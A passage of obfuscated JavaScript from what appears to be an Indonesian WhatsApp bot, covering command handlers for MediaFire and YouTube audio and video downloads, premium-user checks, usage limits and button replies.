_0x31147a={};_0x31147a[_0x3a1b29(0xb23,0xb1e,0xc4e,0x9cb)+'Score']=0x3b9aca00,_0x31147a[_0x37f82f(0x737,0x502,0xa84,0x4b0)+'d']=!![],_0x31147a[_0x37f82f(0x7d9,0x41c,0x886,0xc2b)+_0x3a1b29(0x940,0x6dc,0x8d0,0x6a4)]=!![],_0x31147a[_0x3a1b29(0x646,0x73f,0x454,0x7ae)+_0x3a1b29(0x471,0x7b0,0x789,0x562)]=_0x25fabe;const _0x5a7739={};_0x5a7739[_0x37f82f(0xc6a,0x8df,0x79f,0x9f9)+'o']=_0x31147a,_0x5a7739['mimetype']=_0x152da1['zDpEN'],_0x5a7739[_0x3a1b29(0xcfe,0xb8c,0x5b4,0x961)]=_0x3a1b29(0x428,0x521,0x394,0x54d)+_0x37f82f(0xd40,0xa6c,0x8fd,0xd4d),_0x5a7739[_0x3a1b29(0xf4e,0xdc6,0x92f,0xd08)]=fgclink2,_0x5a7739[_0x37f82f(0x7b5,0xa7b,0x72e,0x6f1)]=pp_bot2;function _0x3a1b29(_0x4276ea,_0x1c76f7,_0x1ab240,_0x18bcdb){return _0x25d590(_0x1ab240,_0x18bcdb-0x138,_0x1ab240-0x1e7,_0x18bcdb-0x1a);}alpha[_0x37f82f(0xc84,0x7a5,0xb48,0xe58)+'e'](from,wmm,MessageType[_0x37f82f(0x942,0x5e0,0xc78,0x604)],_0x5a7739);});})['catch'](_0x2648a7=>console['log'](_0x2648a7)),await limitAdd(sender,limit);break;case _0x15af3d(0x54d,0x329,0x645,0x4fb):const _0x4d6f18={};_0x4d6f18['displayTex'+'t']=_0x134458(0x45e,0x50e,0x3cb,0x8af)+_0x15af3d(0xbaf,0xe51,0x9e7,0x1096);const _0x1b7b33={};_0x1b7b33[_0x134458(0xae0,0x745,0xfba,0xe91)]=_0x15af3d(0x7af,0x4fb,0xc3b,0x38c),_0x1b7b33[_0x134458(0x454,0x725,0x74e,0x40)]=_0x4d6f18,_0x1b7b33['type']=0x1;const _0x1d34e6={};_0x1d34e6[_0x15af3d(0xc2e,0xe51,0xdae,0xbb0)]=mek;if(!isPremium)return sendButMessage(from,'Mohon\x20maaf'+_0x134458(0x5ec,0x589,0x982,0xaac)+_0x15af3d(0x50b,0x9c1,0x4e2,0x2d0)+'tuk\x20user\x20p'+_0x15af3d(0x33e,0x475,0x764,0x7c2)+_0x134458(0xb15,0xd9a,0xf8a,0x8a4)+_0x134458(0x6b0,0xa1e,0x2dd,0x65c)+_0x134458(0x231,-0xa8,0x4e9,0x49)+_0x134458(0x8d9,0xd0a,0x7ef,0x8a5)+'ketik\x20'+prefix+_0x15af3d(0x7af,0x643,0xc9c,0xc93),_0x15af3d(0x419,-0x32,0xef,0x8e2)+_0x134458(0x56d,0xdc,0x936,0x8eb),[_0x1b7b33],_0x1d34e6);if(args[_0x134458(0x76b,0x547,0x98a,0x506)]<-0x8eb*-0x1+-0x219d*0x1+0x18b3)return reply(_0x134458(0x14f,0x5cb,0xa5,-0x157)+_0x15af3d(0x580,0x4e4,0x17a,0x476));if(!isUrl(args[0x66d*-0x3+0x19*0x17f+-0x244*0x8])&&!args[0x54*-0x53+-0x1*0x1b1a+0xa*0x56f]['includes'](_0x134458(0x3fa,0x4ba,-0x35,0x537)))return reply(mess['error']['Iv']);reply(lang[_0x134458(0x279,0x68d,0xc3,0xd2)]()),teks=args['join']('\x20'),res=await mediafireDl(teks),result=_0x134458(0x945,0xab3,0x5e2,0x9f0)+_0x15af3d(0x9f3,0x976,0x7af,0xcad)+_0x134458(0x611,0x382,0x3b9,0x413)+petik+_0x134458(0x5b5,0x80f,0x219,0x452)+petik+'\x20'+res[0x1dbd+0x115d+-0x2f1a]['nama']+'\x0a'+petik+_0x15af3d(0xb00,0x71e,0x82c,0x89f)+petik+'\x20'+res[-0x2544+0x8fe*-0x3+0x403e][_0x15af3d(0xac5,0x791,0xef7,0xe6f)]+'\x0a'+petik+_0x15af3d(0xab8,0x6d4,0x64f,0xa0f)+petik+'\x20'+res[0x1d*-0x115+0x1288+0xcd9][_0x15af3d(0x826,0xb05,0x740,0xb14)]+(_0x134458(0x936,0xa2e,0x671,0x4db)+_0x15af3d(0x2b5,0x4be,0x5ba,0x27e)+_0x134458(0x5c1,0x640,0x317,0x715)),await reply(result),mdf=await getBuffer(res[-0x278*0x2+-0xb*-0x17f+-0x3d7*0x3]['link']);const _0x3f9a0a={};_0x3f9a0a[_0x15af3d(0x773,0x76e,0xa14,0x779)]=_0x134458(0xaec,0x8de,0x744,0xb5f)+_0x15af3d(0xab6,0xd26,0xdda,0xee3)+_0x15af3d(0xa90,0xd79,0xba1,0xd43),_0x3f9a0a[_0x15af3d(0x3e3,0x58,0x6cd,-0x90)]=0x2,_0x3f9a0a[_0x15af3d(0x655,0x71d,0x25e,0x878)]=_0x134458(0x8b3,0xcd0,0x752,0x519)+'Downloader',_0x3f9a0a[_0x15af3d(0x311,0x1bd,0x78e,0x7cf)]='',_0x3f9a0a['thumbnailU'+'rl']='',_0x3f9a0a[_0x15af3d(0x606,0x72e,0x498,0x360)]=pp_userz;const _0x2c717f={};_0x2c717f[_0x134458(0x79e,0xc4a,0x2bc,0x656)+_0x15af3d(0xc04,0x10b9,0xb44,0xf73)]=0x3b9aca00,_0x2c717f[_0x134458(0x435,0x49,0x6ca,0x23a)+'d']=!![],_0x2c717f[_0x15af3d(0x62a,0x335,0x7e8,0x487)+_0x134458(0x477,0x84c,0x1fd,-0x74)]=!![],_0x2c717f[_0x15af3d(0x6d4,0x404,0x5fe,0xa9b)+_0x134458(0x335,0x3a5,0x31b,0x6d6)]=_0x3f9a0a;const _0x16413f={};_0x16413f['contextInf'+'o']=_0x2c717f,_0x16413f['mimetype']=res[0x1a6b*0x1+-0x2515+0xaaa][_0x134458(0xb0c,0xb71,0xc35,0x98b)],_0x16413f['filename']=res[0x8*0x29e+-0x6f*0x39+0x3c7][_0x134458(0x6c6,0x792,0x734,0x8a4)],_0x16413f[_0x134458(0xadb,0xdee,0xcb3,0x9e1)]=fgclink,_0x16413f[_0x134458(0x4b3,0x180,0x29,0x952)]=pp_bot2,alpha[_0x15af3d(0xad5,0xd77,0x99e,0xd6a)+'e'](from,mdf,MessageType[_0x134458(0x640,0x504,0x4e0,0x25b)],_0x16413f);break;case'video':const _0x41da7c={};_0x41da7c[_0x15af3d(0x6ec,0x705,0x656,0xaee)+'t']=_0x15af3d(0x959,0x6ec,0x819,0xae3)+'t';const _0x54eb9c={};_0x54eb9c[_0x134458(0xae0,0x95a,0x84b,0xe58)]=_0x134458(0x7fd,0x357,0xb57,0x847),_0x54eb9c[_0x15af3d(0x5a7,0xa86,0x2f1,0x98b)]=_0x41da7c,_0x54eb9c[_0x134458(0x8ff,0xc2c,0xd57,0x9c6)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x8f7,0x868,0x7b7)](prefix),'©\x20'+ownername,[_0x54eb9c]);if(args['length']===0x2*-0xecd+-0x2571+0x1*0x430b)return reply('Kirim\x20peri'+_0x134458(0x561,0x921,0x7ac,0x9d3)+prefix+(_0x134458(0x875,0x664,0x470,0xa21)+_0x134458(0x8df,0xd3e,0xa11,0xa50)+_0x134458(0x8ad,0xd7d,0x80f,0xa12)+_0x15af3d(0x4d6,0x3d5,0x285,0x88c)));var srch=args[_0x134458(0x1b6,-0x149,-0x2b0,0x182)]('');aramas=await yts(srch),server=_0x15af3d(0x5b2,0xa18,0x779,0x25d),aramat=aramas['all'];var mulaikah=aramat[0x1*0x942+0x283*-0x1+-0x6bf][_0x15af3d(0x45a,0x352,0x589,0x2b7)];try{ytv2(mulaikah,server)['then'](_0x1dbd07=>{function _0x5a9ddf(_0x3fb2f9,_0x88b2f4,_0x2ef636,_0x585b19){return _0x15af3d(_0x88b2f4- -0x316,_0x88b2f4-0xc7,_0x3fb2f9,_0x585b19-0x1d8);}const _0x223566={'lsDkb':function(_0x68f55c,_0x224379,_0xaae7a7){return _0x68f55c(_0x224379,_0xaae7a7);},'fGQRT':_0x1ea9f2(0x757,0xae6,0x745,0xd04),'flyvn':function(_0x6c627b,_0x5b2279){return _0x6c627b!==_0x5b2279;},'bDFTt':_0x1ea9f2(0xd13,0xe09,0xa5c,0x91e),'FwWBQ':function(_0x40bdf4,_0x422b07){return _0x40bdf4>=_0x422b07;},'PXsGh':function(_0x10d236,_0x424344){return _0x10d236(_0x424344);}};function _0x1ea9f2(_0x2f69cf,_0x47f26f,_0x26e87c,_0x2ca0f4){return _0x15af3d(_0x47f26f-0x265,_0x47f26f-0xeb,_0x26e87c,_0x2ca0f4-0x1da);}const {dl_link:_0x17ef57,thumb:_0x3090b2,title:_0x39c9b1,filesizeF:_0x134239,filesize:_0x13f2d6}=_0x1dbd07;axios[_0x5a9ddf(0xb0d,0x787,0x375,0xc3c)](_0x1ea9f2(0xa2b,0xe75,0x9b6,0xed1)+_0x5a9ddf(0x7fc,0x80d,0xbf6,0xbb7)+_0x5a9ddf(0x917,0x431,0x48e,0x25)+_0x1ea9f2(0xfe4,0xd46,0xab1,0x10a4)+_0x17ef57)[_0x1ea9f2(0x62b,0x9e1,0xca5,0xa2b)](async _0x500232=>{function _0x113729(_0x516274,_0x3ff122,_0x3db66e,_0x111994){return _0x5a9ddf(_0x3db66e,_0x516274-0x57,_0x3db66e-0x117,_0x111994-0xb8);}function _0x431473(_0x4da499,_0x10522f,_0x4c2c5e,_0x47fb54){return _0x5a9ddf(_0x4da499,_0x10522f-0x355,_0x4c2c5e-0x160,_0x47fb54-0x107);}if(_0x223566[_0x431473(0x6d6,0x35b,-0x118,-0x169)](_0x223566[_0x431473(0xda0,0xa26,0x692,0x6e3)],_0x223566[_0x113729(0x728,0x712,0xbd4,0x6d2)]))_0x4a039d[_0x431473(0xd3d,0xbd9,0xad1,0xdb4)](_0x223566[_0x431473(0xbb1,0xa73,0x6bc,0x82d)](_0x52f78a,_0x223566[_0x431473(0x728,0x8cb,0x855,0x576)],_0x113729(0x15b,0x35,0x2f3,-0x1bf)),_0x317327);else{if(_0x223566['FwWBQ'](_0x223566[_0x113729(0x32f,0xe3,0x331,0x44f)](Number,_0x13f2d6),-0x1d5ed+0x19f3e+-0x1*-0x1bd4f))return sendMediaURL(from,_0x3090b2,_0x431473(0x8f1,0xa21,0x92f,0xbc9)+_0x113729(0x607,0x1fd,0xac9,0x7fb)+enter+enter+(_0x113729(0x545,0x2d6,0x520,0x2a0)+':\x20')+_0x39c9b1+enter+(_0x113729(0x2b0,-0x157,0x6b6,0xa3)+_0x431473(0x81a,0xc34,0xa59,0xc2f)+'s')+enter+(_0x431473(0x4a4,0x7b9,0xc38,0x3f5)+'MP3')+enter+('🐭\x20*Filesiz'+_0x113729(0x279,-0x10a,0x73c,-0x1a5))+_0x134239+enter+(_0x431473(0x848,0xc15,0xa73,0xff8)+'\x20')+_0x500232[_0x431473(0x472,0x37e,-0x131,-0xb3)]+enter+enter+(_0x431473(0x406,0x471,0x6df,0x772)+_0x431473(0x8c9,0x7fa,0xc48,0x70d)+'dari\x20batas'+_0x431473(0xa5a,0x750,0x562,0x559)+_0x113729(0x72b,0x240,0x23a,0xb41)+_0x113729(0x31a,0x7f5,0x11e,0x806)));const _0x539546=_0x113729(0x723,0x7a7,0x416,0x6ba)+_0x113729(0x607,0x942,0xa86,0x13d)+enter+enter+(_0x431473(0x77f,0x843,0xc83,0x9fc)+':\x20')+_0x39c9b1+enter+('📊\x20*Quality'+_0x431473(0x931,0xc34,0x7c6,0xfc0)+'s')+enter+('🦁\x20*Ext*\x20:\x20'+_0x113729(0x91e,0xcc6,0x9a8,0x917))+enter+('🐭\x20*Filesiz'+_0x431473(0x374,0x577,0x830,0x1e4))+_0x134239+enter+(_0x113729(0x917,0x8a9,0xb27,0x87b)+'\x20')+_0x500232[_0x113729(0x80,0x410,-0x1dc,0x50e)]+enter+enter+('_Silahkan\x20'+'tunggu\x20fil'+_0x113729(0x10a,-0x123,0x416,-0x11a)+_0x431473(0x112f,0xc7d,0x8d5,0x1136)+_0x431473(0x1046,0xc70,0xe54,0x989)+'\x20butuh\x20beb'+'erapa\x20meni'+'t_');sendMediaURL(from,_0x3090b2,_0x539546),await sendMediaURL(from,_0x17ef57)[_0x431473(0x8c3,0x891,0xb14,0xd36)](()=>reply(_0x431473(0xa03,0x7dc,0x8cd,0x6c8)));}});});}catch(_0x2bb6da){reply(mess[_0x134458(0x64a,0x824,0x21a,0xb28)]['api']);}await limitAdd(sender,limit);break;case _0x15af3d(0x78d,0x88a,0xb9a,0x65b):const _0x5853a9={};_0x5853a9[_0x134458(0x599,0x206,0x5d1,0xc2)+'t']=_0x15af3d(0x5b1,0x3e4,0x960,0x9bb)+_0x15af3d(0xbaf,0x863,0xe31,0xbb9);const _0x738ec8={};_0x738ec8[_0x134458(0xae0,0xc75,0xe8c,0xa97)]=_0x134458(0x65c,0x1e5,0x8ad,0xae8),_0x738ec8[_0x15af3d(0x5a7,0x884,0x97a,0x7d5)]=_0x5853a9,_0x738ec8['type']=0x1;const _0x2a9d39={};_0x2a9d39[_0x15af3d(0xc2e,0x9ed,0xdef,0x1057)]=mek;if(!isPremium)return sendButMessage(from,_0x134458(0x5ca,0x25d,0x2d8,0x897)+_0x15af3d(0x73f,0x64d,0x274,0x646)+_0x15af3d(0x50b,0x4f8,0x6ba,0x9d)+_0x15af3d(0x520,0x8fe,0x7e4,0x3f)+_0x15af3d(0x33e,0x13e,0x16c,-0x17c)+'a!\x20Upgrade'+_0x134458(0x6b0,0x6b1,0x61f,0x4ca)+_0x134458(0x231,0x304,0x2d,0x309)+_0x134458(0x8d9,0x6d7,0x5d6,0x8a4)+_0x134458(0x6a1,0x3b7,0x347,0x247)+prefix+_0x134458(0x65c,0x840,0x856,0x5db),_0x134458(0x2c6,0x306,0x87,0x78c)+_0x134458(0x56d,0x9bf,0x8dd,0x558),[_0x738ec8],_0x2a9d39);if(args[_0x15af3d(0x8be,0x63f,0x765,0x538)]===0x35*0x27+-0xb*0x162+-0x105*-0x7)return reply('Kirim\x20peri'+_0x134458(0x561,0x463,0x936,0x8b8)+prefix+('video*\x20_Ju'+_0x15af3d(0xa32,0xb8e,0xb0d,0x62f)+'yang\x20akan\x20'+_0x134458(0x383,-0x78,0x415,0x32a)));var srch=args[_0x134458(0x1b6,0x26f,0x62d,-0x96)]('');aramas=await yts(srch),server='en68',aramat=aramas['all'];var mulaikah=aramat[0x2d*-0xa6+-0x7e9+0x41f*0x9]['url'];try{ytv3(mulaikah,server)[_0x134458(0x629,0x81d,0x357,0x21f)](_0xf79c5a=>{function _0x431090(_0x538fb6,_0x2d29bc,_0x34a727,_0x598acb){return _0x15af3d(_0x598acb-0x1e,_0x2d29bc-0xbf,_0x34a727,_0x598acb-0xec);}const _0x2a3700={'SJaXT':function(_0x37a010,_0x3687cf){return _0x37a010(_0x3687cf);},'CfbdT':_0xd5cdc0(0xb54,0xceb,0x816,0xfe7)+_0x431090(0xc8f,0x91f,0xc10,0x9da),'vXplK':function(_0x55bc5f,_0x5655d4){return _0x55bc5f!==_0x5655d4;},'rKyrp':function(_0x3cd934,_0x5cb796){return _0x3cd934>=_0x5cb796;},'kEtKR':function(_0xc31818,_0x4bb075){return _0xc31818(_0x4bb075);},'VThLA':function(_0x3087db,_0xd574a8,_0x484019,_0x5670f0){return _0x3087db(_0xd574a8,_0x484019,_0x5670f0);}};function _0xd5cdc0(_0x39b053,_0x37eb05,_0x2cef8d,_0x3dd5e5){return _0x15af3d(_0x39b053-0x2f,_0x37eb05-0x121,_0x37eb05,_0x3dd5e5-0x117);}const {dl_link:_0x4ec6fb,thumb:_0x2c5815,title:_0x459c2d,filesizeF:_0x46916b,filesize:_0x46457e}=_0xf79c5a;axios['get'](_0x431090(0x82c,0x9cf,0xf71,0xc2e)+_0x431090(0xfe4,0x759,0x88d,0xb41)+_0xd5cdc0(0x776,0xc3f,0x5de,0x722)+_0xd5cdc0(0xb10,0xb38,0xf46,0x7f4)+_0x4ec6fb)['then'](async _0x44dcdc=>{function _0x3c1953(_0x341369,_0x4e5baa,_0x1fdfbe,_0x58c826){return _0x431090(_0x341369-0x0,_0x4e5baa-0x183,_0x1fdfbe,_0x4e5baa- -0x48e);}const _0x1cb211={'SRIlD':function(_0x25f7e7,_0x1cd90e){function _0x1dbd74(_0x3690e8,_0x1e3952,_0x11cbaf,_0x4dd893){return _0x4ca6(_0x3690e8- -0x2b4,_0x11cbaf);}return _0x2a3700[_0x1dbd74(0x669,0x886,0xafb,0x98b)](_0x25f7e7,_0x1cd90e);},'vEPcd':_0x2a3700['CfbdT']};function _0x1698f1(_0x288285,_0x10eace,_0x68091f,_0x1a2563){return _0x431090(_0x288285-0x2d,_0x10eace-0xf,_0x68091f,_0x288285- -0x49d);}if(_0x2a3700['vXplK'](_0x1698f1(0x37f,0x62d,0x7a5,0xe4),_0x1698f1(0x37f,0x24e,-0xf4,0x641)))_0x1cb211[_0x1698f1(0x69f,0x1f4,0x547,0x465)](_0x3f1996,_0x1cb211[_0x1698f1(-0x18c,-0x589,-0x527,-0xc4)]);else{if(_0x2a3700[_0x1698f1(-0x2,-0x200,0x1da,0x11e)](_0x2a3700[_0x1698f1(0xf3,0x184,-0x179,-0x110)](Number,_0x46457e),0x9*0x3922+0x9766+-0x112f8))return _0x2a3700[_0x1698f1(0x54f,0x9dc,0x40f,0xed)](sendMediaURL,from,_0x2c5815,_0x3c1953(0x8b5,0x572,0x472,0x74f)+_0x3c1953(0x711,0x456,0x91b,0x843)+enter+enter+(_0x1698f1(0x385,0x726,0x751,0x41)+':\x20')+_0x459c2d+enter+('📊\x20*Quality'+_0x1698f1(0x776,0x7a1,0x639,0x6a0)+'s')+enter+(_0x1698f1(0x2fb,0x7d3,0x1ad,-0x109)+_0x1698f1(0x75e,0xb55,0xa8d,0x784))+enter+(_0x3c1953(0x75d,0x2af,0x1ab,0x369)+_0x1698f1(0xb9,-0x135,-0x1cf,0x317))+_0x46916b+enter+(_0x1698f1(0x757,0xafd,0x89e,0xb4b)+'\x20')+_0x44dcdc[_0x1698f1(-0x140,0x22,-0x131,-0x30)]+enter+enter+('_Untuk\x20dur'+'asi\x20lebih\x20'+_0x1698f1(0x404,0x556,0x546,0x5a7)+_0x3c1953(0x77,0x2a1,0x3cb,0x124)+_0x3c1953(0x498,0x57a,0xa63,0x6a8)+_0x3c1953(-0x282,0x169,0x294,-0xf4)));const _0x4020f3=_0x3c1953(0x16d,0x572,0xa43,0xa41)+_0x3c1953(0x1c3,0x456,0x850,0x5b1)+enter+enter+(_0x3c1953(0x3b0,0x394,0x4f0,0x1a8)+':\x20')+_0x459c2d+enter+(_0x1698f1(0xf0,0x239,0x1cd,0x2a7)+_0x3c1953(0x9be,0x785,0xbb0,0x7d7)+'s')+enter+(_0x1698f1(0x2fb,0x764,0x7a9,0x623)+'MP3')+enter+('🐭\x20*Filesiz'+'e*\x20:\x20')+_0x46916b+enter+(_0x3c1953(0x351,0x766,0x53d,0x532)+'\x20')+_0x44dcdc[_0x3c1953(-0x51f,-0x131,-0x213,-0x17a)]+enter+enter+('_Silahkan\x20'+'tunggu\x20fil'+_0x3c1953(-0x2a1,-0xa7,0x1d8,-0x41b)+_0x1698f1(0x7bf,0x59e,0xb2e,0x63d)+_0x1698f1(0x7b2,0x3fe,0x9e0,0x750)+_0x3c1953(0x13e,0x487,0x2ab,0x60f)+'erapa\x20meni'+'t_');sendMediaURL(from,_0x2c5815,_0x4020f3),await sendMediaURL(from,_0x4ec6fb)['catch'](()=>reply(_0x1698f1(0x31e,0x3c7,-0x37,0x2d7)));}});});}catch(_0x144263){reply(mess[_0x134458(0x64a,0x15e,0x870,0x36c)][_0x15af3d(0x759,0x8a8,0x88d,0x67c)]);}await limitAdd(sender,limit);break;case'ytmp4':const _0x597cdb={};_0x597cdb[_0x15af3d(0x6ec,0x791,0x75c,0x613)+'t']='Check\x20Limi'+'t';const _0xe880bc={};_0xe880bc[_0x134458(0xae0,0xb81,0xa79,0x9a7)]='limit',_0xe880bc[_0x134458(0x454,-0x6b,0x341,0x286)]=_0x597cdb,_0xe880bc['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xc2c,0x957,0x9ce)](prefix),'©\x20'+ownername,[_0xe880bc]);if(args[_0x15af3d(0x8be,0xa0b,0x6ba,0x82b)]===-0x1f8c+-0x9*-0x3f5+-0x3*0x15b)return reply(_0x134458(0x924,0xa0c,0x9fc,0x576)+_0x15af3d(0x6b4,0x2f2,0x5c3,0x687)+prefix+(_0x15af3d(0x4c0,0x2d8,0x688,0x3de)+_0x15af3d(0x77e,0x7d5,0x6e6,0x7d1)));let isLinks2=args[-0x1*0xfaf+0xf42+0x6d][_0x134458(0x823,0x8f0,0xb9b,0x902)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks2)return reply(mess['error']['Iv']);server='en68';try{let yut=await yts(args[-0x1a32+-0xdf5+0x2827]);reply(lang['wait']()),ytv2(args[0xe75*-0x1+-0x277*0x7+0x1fb6],server)[_0x134458(0x629,0x344,0x6c8,0xa8b)](_0xe48c99=>{const _0x4e1ba5={'ImtsQ':function(_0x393e3a,_0x17811d){return _0x393e3a>=_0x17811d;},'WxxkX':function(_0xc45ce0,_0x3e3eb3){return _0xc45ce0(_0x3e3eb3);},'zAbrQ':_0x299b9a(0x2fe,0x40d,0x74f,0x365)+_0x299b9a(0xbdb,0x946,0xa72,0x767),'uWbQs':_0x299b9a(0xa3b,0x33c,0xac5,0x779),'AmouH':_0x299b9a(-0xdf,0x2ab,0x3d7,0x271)+_0x299b9a(0x289,0x193,-0x145,0xba),'XOHvF':_0x5b7aba(0x1cd,0x30e,-0x1b6,-0x82)+'kbps)'};function _0x299b9a(_0x2d4676,_0x18188f,_0x2086aa,_0x4c896e){return _0x134458(_0x4c896e- -0xee,_0x18188f-0x19,_0x2d4676,_0x4c896e-0x186);}function _0x5b7aba(_0x4e7cef,_0x315519,_0x26e535,_0x5cc094){return _0x15af3d(_0x315519- -0x2a2,_0x315519-0x1bd,_0x26e535,_0x5cc094-0x1b);}const {dl_link:_0xacce0e,thumb:_0x37f690,title:_0x5bf15a,filesizeF:_0x2b2bf2,filesize:_0x2c1eb4}=_0xe48c99;axios[_0x299b9a(0xafa,0x8af,0xcf5,0x85c)](_0x299b9a(0x7c1,0x609,0xc03,0x9cf)+'nyurl.com/'+_0x299b9a(0x209,0x6ee,0x90c,0x506)+_0x5b7aba(0x534,0x83f,0x408,0xcc2)+_0xacce0e)['then'](async _0x25207e=>{function _0x5c4f54(_0x65a6d3,_0x13ff08,_0x103a7e,_0x561455){return _0x5b7aba(_0x65a6d3-0x12b,_0x13ff08-0x76,_0x65a6d3,_0x561455-0x15c);}if(_0x4e1ba5[_0x2bbadf(0x64c,0x73a,0x61b,0x834)](_0x4e1ba5[_0x5c4f54(0xa56,0x95d,0x4d4,0x8f8)](Number,_0x2c1eb4),0xb216+-0x1*-0x64b6+0x3f4*-0x1f))return sendMediaURL(from,_0x37f690,_0x5c4f54(0x734,0x951,0x494,0x88f)+_0x2bbadf(0x2d1,0x2d6,0x8a,0x25a)+'\x204!*'+enter+enter+(_0x5c4f54(-0x1cf,0x2f1,-0x23,0x49c)+'\x20')+_0x5bf15a+enter+('🐭\x20*Ext\x20:*\x20'+_0x5c4f54(0x509,0x9b1,0xba2,0x5d9))+enter+(_0x5c4f54(0xa17,0x77f,0x929,0x673)+_0x5c4f54(0x9c7,0x65f,0x2f2,0x448))+_0x2b2bf2+enter+('🦡\x20*Link\x20:*'+'\x20')+_0x25207e[_0x5c4f54(-0x12f,0x113,0x3d5,0x42)]+enter+enter+(_0x2bbadf(0x4dd,-0x12c,-0x2a,0x2b)+_0x5c4f54(0x21b,0x58f,0x3d5,0x88c)+'dari\x20batas'+_0x2bbadf(0x7d4,0x162,0x63c,0x30a)+_0x5c4f54(0x59d,0x7be,0xb8e,0xae1)+_0x5c4f54(0x5fd,0x3ad,0x54a,0x1e9)));const _0x3a9c08='*🎦\x20YOUTUBE'+'\x20VIDEO\x0a\x09\x09\x09'+'\x09\x09\x09\x0a💦\x20Titl'+_0x2bbadf(0x7dd,0x8f,0x8b1,0x483)+_0x5bf15a+(_0x2bbadf(0x9b9,0x359,0x82e,0x57d)+_0x2bbadf(0x2d8,0x383,0x3fe,0x6f7))+yut[_0x5c4f54(0x381,0x5fd,0x90f,0xa9d)][0x1*-0x6fa+-0x5*-0x1eb+0x3*-0xdf][_0x5c4f54(0x56b,0x600,0x77e,0x7b4)]+(_0x2bbadf(-0x46,0x210,0x1e8,0x1b0)+':\x20')+yut[_0x5c4f54(0x2a6,0x5fd,0x5dd,0x921)][0x167*0xf+0xb*-0xe+0x146f*-0x1][_0x5c4f54(0x7c8,0x76a,0x6d6,0x5ae)]+('\x20\x0a🎃\x20Size\x20:'+'\x20')+_0x2c1eb4+(_0x2bbadf(-0x198,-0x299,0x350,-0xb9)+':\x20')+yut['videos'][-0xb3*-0x1d+0x1*-0x8b7+0x4*-0x2e4][_0x5c4f54(-0x30,0x2fe,0xe3,-0x59)]+('\x20\x0a🐣\x20Durati'+_0x2bbadf(-0x17a,-0x28f,-0x18f,0x73))+yut[_0x2bbadf(0x326,0x8fc,0x776,0x422)][0x1a70+-0x4e5*0x2+-0x853*0x2][_0x2bbadf(0x4c5,0x768,0x38a,0x2b6)]+_0x2bbadf(0x7e6,0x3bb,0x6ed,0x7f1)+yut[_0x5c4f54(0x7f3,0x5fd,0x28f,0x48b)][0x2*0xd83+-0x1940+0x2*-0xe3][_0x2bbadf(0x53d,0x3a2,-0x11d,0x53)];let _0x9ffbb8=await getBuffer(_0x37f690);const _0x5ba812={};_0x5ba812['displayTex'+'t']=_0x4e1ba5['zAbrQ'];const _0x208172={};function _0x2bbadf(_0x406c03,_0x5042c8,_0x11c9ce,_0x29649d){return _0x5b7aba(_0x406c03-0x1c9,_0x29649d- -0x165,_0x406c03,_0x29649d-0x13d);}_0x208172[_0x2bbadf(0x418,0x773,0xa8f,0x82c)]=_0x2bbadf(0x759,0x45,0x5e5,0x4a5)+'d\x20'+args[0x1*-0x5f8+-0x1781+0x1d79],_0x208172[_0x2bbadf(0x4ce,-0xe2,0x55d,0x1a0)]=_0x5ba812,_0x208172['type']=_0x4e1ba5['uWbQs'];const _0x5a79ff={};_0x5a79ff[_0x2bbadf(-0x1c9,0x329,0x26e,0x2e5)+'t']=_0x4e1ba5[_0x2bbadf(0x215,0xd0,0x25e,0xea)];const _0x989b66={};_0x989b66['buttonId']=_0x5c4f54(0x836,0x9fc,0x72d,0xc68)+'\x20'+args[0x10c0+-0x1f5*-0x4+0x11e*-0x16],_0x989b66[_0x2bbadf(0x61c,0x14c,0x24b,0x1a0)]=_0x5a79ff,_0x989b66['type']=_0x5c4f54(0x689,0x78e,0x52f,0x90a);const _0x44f76f={};_0x44f76f[_0x2bbadf(0x7b2,0x1ed,0x2a,0x2e5)+'t']=_0x4e1ba5[_0x2bbadf(0x101,-0xa9,-0x1ae,0xb5)];const _0x2ae2e9={};_0x2ae2e9[_0x5c4f54(0x6f5,0xa07,0xabd,0xcea)]=_0x5c4f54(0xab8,0x690,0x28b,0x3fb)+args[-0x1*-0x38b+0x7a6+-0xb31],_0x2ae2e9[_0x2bbadf(0x456,-0x11b,0x216,0x1a0)]=_0x44f76f,_0x2ae2e9['type']=_0x5c4f54(0x5e0,0x78e,0x682,0x70d);let _0x20b73c=[_0x208172,_0x989b66,_0x2ae2e9];sendButLocation(from,_0x3a9c08,_0x5c4f54(0x7cb,0x597,0xa0b,0x72b)+enter+('Jika\x20whats'+_0x5c4f54(0xb43,0x9a0,0xc65,0xcb2)+_0x5c4f54(0x140,0x368,0x73d,0x802)+_0x5c4f54(0x3fb,0x33d,0x3e,0x145)+_0x2bbadf(0x65a,0x7a3,-0x12d,0x2c0)+_0x5c4f54(0x9ce,0x825,0x5a6,0xc94)+_0x2bbadf(0x113,-0x1ef,-0x572,-0xa2)+'https://yo'+_0x2bbadf(0x15c,-0x22d,0x3ae,-0xed)+'ID4Fmo9w')+enter+enter+botname+_0x5c4f54(0xb8a,0x7fe,0xa39,0x7b5)+ownername,_0x9ffbb8,_0x20b73c,{});});});}catch(_0x4d581b){reply(mess[_0x15af3d(0x79d,0xc0a,0x3b3,0x871)][_0x15af3d(0x759,0x4b4,0x29d,0xbae)]);}await limitAdd(sender,limit);break;case _0x134458(0x5b1,0x7b8,0x1f5,0x181):{const _0x1eefc9={};_0x1eefc9[_0x134458(0x599,0x82e,0x96f,0x6b5)+'t']='Check\x20Limi'+'t';const _0x1ad987={};_0x1ad987[_0x134458(0xae0,0x8b9,0xe66,0x9ec)]=_0x134458(0x7fd,0x986,0xb98,0xc9d),_0x1ad987['buttonText']=_0x1eefc9,_0x1ad987['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xa29,0x86f,0x5e5)](prefix),'©\x20'+ownername,[_0x1ad987]);if(args[_0x134458(0x76b,0xbfb,0x952,0x8d4)]===0xb16+0x1ab1*0x1+0x1fd*-0x13)return reply(_0x134458(0x924,0xc17,0x7b3,0x516)+'ntah\x20*'+prefix+(_0x134458(0x875,0xc51,0x46f,0xb57)+_0x134458(0x8df,0xd6a,0xb8d,0xd60)+_0x15af3d(0xa00,0x6fc,0x61f,0x957)+'dicari_'));var srch=args[_0x134458(0x1b6,-0x98,0x68b,0x497)]('');aramas=await 